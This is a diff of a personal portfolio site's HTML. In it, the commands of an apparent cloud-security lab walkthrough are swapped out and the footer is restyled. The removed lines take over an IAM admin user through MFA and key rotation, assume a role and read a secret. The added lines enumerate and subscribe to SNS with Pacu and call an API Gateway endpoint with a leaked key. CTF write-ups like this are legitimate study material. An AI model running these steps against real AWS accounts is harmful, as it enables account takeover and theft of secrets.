-</span></span><span style="display:flex;"><span><span style="color:#75715e">#Set up MFA</span>
-</span></span><span style="display:flex;"><span>aws iam create-virtual-mfa-device --virtual-mfa-device-name admin-virt-mfa --outfile mfa-qr.png --profile iam_key_rotation --bootstrap-method QRCodePNG
-</span></span><span style="display:flex;"><span>aws iam enable-mfa-device --user-name admin_cgidf88xs8i2ur --serial-number arn:aws:iam::381491899745:mfa/admin-virt-mfa --authentication-code1 CODE1 --authentication-code2 CODE2 --profile iam_key_rotation
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#Alternatively using pacu</span>
+</span></span><span style="display:flex;"><span>pacu
+</span></span><span style="display:flex;"><span>run sns__enum --region us-east-1
+</span></span><span style="display:flex;"><span>data iam 
+</span></span><span style="display:flex;"><span>run sns__subscribe
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">#Delete old key &amp; make fresh one</span>
-</span></span><span style="display:flex;"><span>aws iam delete-access-key --profile iam_key_rotation --user-name admin_cgidf88xs8i2ur --access-key-id AKIAVRUVQNVQ3RMHLPPL
-</span></span><span style="display:flex;"><span>aws iam create-access-key --profile iam_key_rotation --user-name admin_cgidf88xs8i2ur
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#Find the api</span>
+</span></span><span style="display:flex;"><span>aws apigateway get-rest-apis --profile sns_low
+</span></span><span style="display:flex;"><span>aws apigateway get-resources --rest-api-id 696zi4tra7 --region us-east-1 --profile sns_low
+</span></span><span style="display:flex;"><span>aws apigateway get-stages --rest-api-id 696zi4tra7 --region us-east-1 --profile sns_low
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">#Take on role</span>
-</span></span><span style="display:flex;"><span>aws sts assume-role --role-arn arn:aws:iam::381491899745:role/cg_secretsmanager_cgidf88xs8i2ur --role-session-name magic --serial-number arn:aws:iam::381491899745:mfa/admin-virt-mfa --token-code <span style="color:#ae81ff">005780</span> --profile admin
-</span></span><span style="display:flex;"><span>aws configure --profile iam_key_role
-</span></span><span style="display:flex;"><span>aws configure set profile.iam_key_role.aws_session_token TOKEN HERE
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">#Grab secret</span>
-</span></span><span style="display:flex;"><span>aws secretsmanager list-secrets --profile iam_key_role 
-</span></span><span style="display:flex;"><span>aws secretsmanager get-secret-value --profile iam_key_role --secret-id arn:aws:secretsmanager:us-east-1:381491899745:secret:cg_secret_cgidf88xs8i2ur-jghZnP
-</span></span></code></pre></div>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#And call it for the flag</span>
+</span></span><span style="display:flex;"><span>curl -v -H <span style="color:#e6db74">&#34;x-api-key: 45a3da610dc64703b10e273a4db135bf&#34;</span> https://696zi4tra7.execute-api.us-east-1.amazonaws.com/prod-cgidth6ftmf8pq/user-data
+</span></span></code></pre></div><pre tabindex="0"><code></code></pre>
   </div>
 </article>
 
     
-<script defer src="https://cdn.jsdelivr.net/npm/alpinejs@3.x.x/dist/cdn.min.js"></script>
 
 <script src="../../js/darkmode.js" defer></script>
-  
+<script src="https://unpkg.com/alpinejs@3.x.x/dist/cdn.min.js" defer></script>
 
+<footer class="bg-gray-200 dark:bg-gray-900 border-t border-gray-300 dark:border-gray-700">
+  <div class="max-w-md px-4 py-12 mx-auto overflow-hidden sm:max-w-3xl sm:px-6 lg:max-w-7xl lg:px-8">
 
-  
-  <script src="https://cdn.jsdelivr.net/npm/swiper@11/swiper-bundle.min.js" defer></script>
+    
+    <nav class="flex flex-wrap justify-center -mx-5 -my-2" aria-label="Footer">
+      
+      <div class="px-5 py-2">
+        <a href="http://localhost:1313/about/"
+           class="text-base text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white transition-colors">
+          About
+        </a>
+      </div>
+      
+      <div class="px-5 py-2">
+        <a href="http://localhost:1313/biomedical/"
+           class="text-base text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white transition-colors">
+          Biomedical
+        </a>
+      </div>
+      
+      <div class="px-5 py-2">
+        <a href="http://localhost:1313/software/"
+           class="text-base text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white transition-colors">
+          Software
+        </a>
+      </div>
+      
+      <div class="px-5 py-2">
+        <a href="http://localhost:1313/cybersecurity/"
+           class="text-base text-gray-700 dark:text-gray-300 hover:text-gray-900 dark:hover:text-white transition-colors">
+          Cybersecurity
+        </a>
+      </div>
+      
+    </nav>
 
-  <script defer>
-    document.addEventListener('DOMContentLoaded', () => {
-      new Swiper('.swiper', {
-        effect: 'coverflow',
-        grabCursor: true,
-        centeredSlides: true,
+    
+    <p class="mt-8 text-base text-center text-gray-600 dark:text-gray-400">
+      &copy; 2025 Personal Portfolio. All rights reserved.
+    </p>
 
-        slidesPerView: 'auto',
-        spaceBetween: 30,
-        loop: true,
+    
+    <p class="mt-2 text-base text-center text-gray-800 dark:text-gray-300">
+      Theme made with ❤️ by
+      <a href="https://nusserstudios.com"
+         class="hover:underline text-gray-800 dark:text-gray-300 hover:text-black dark:hover:text-white transition-colors">
+        <span class="font-black uppercase">Nusser</span>
+        <span class="font-light uppercase">Studios.</span>
+      </a>
+    </p>
 
-        coverflowEffect: {
-          rotate: 30,
-          stretch: 0,
-          depth: 150,
-          modifier: 1,
-          slideShadows: true,
-        },
-
-        
-        pagination: {
-          el: '.swiper-pagination',
-          clickable: true,
-        },
-        
-        navigation: {
-          nextEl: '.swiper-button-next',
-          prevEl: '.swiper-button-prev',
-        },
-
-        on: {
-          slideChange() {
-            
-            const idx = this.realIndex;
-            document.getElementById('cert-caption').innerText = certData[idx].description;
-          }
-        }
-      });
-    });
-  </script>
-
-
-
-<footer class="bg-gray-900">
-    <div class="max-w-md px-4 py-12 mx-auto overflow-hidden sm:max-w-3xl sm:px-6 lg:max-w-7xl lg:px-8">
-        <nav class="flex flex-wrap justify-center -mx-5 -my-2" aria-label="Footer">
-            
-            <div class="px-5 py-2">
-                <a href="http://localhost:1313/about/" class="text-base text-gray-400 hover:text-gray-300">About</a>
-            </div>
-            
-            <div class="px-5 py-2">
-                <a href="http://localhost:1313/cybersecurity" class="text-base text-gray-400 hover:text-gray-300">Cybersecurity</a>
-            </div>
-            
-            <div class="px-5 py-2">
-                <a href="http://localhost:1313/walkthroughs" class="text-base text-gray-400 hover:text-gray-300">Walkthroughs</a>
-            </div>
-            
-        </nav>
-        <p class="mt-8 text-base text-center text-gray-400">&copy; 2025
-            Personal Portfolio. All rights
-            reserved.</p>
-        <p class="mt-2 text-base text-center text-gray-400">Theme made with &#x2764;&#xfe0f; by <a
-               href="https://nusserstudios.com" class="hover:underline hover:text-primary-600"><span
-                      class="font-black uppercase">Nusser</span> <span class="font-light uppercase">Studios.</span></a>
-        </p>
-    </div>
+  </div>
 </footer>
+
 </body>
 
 </html>
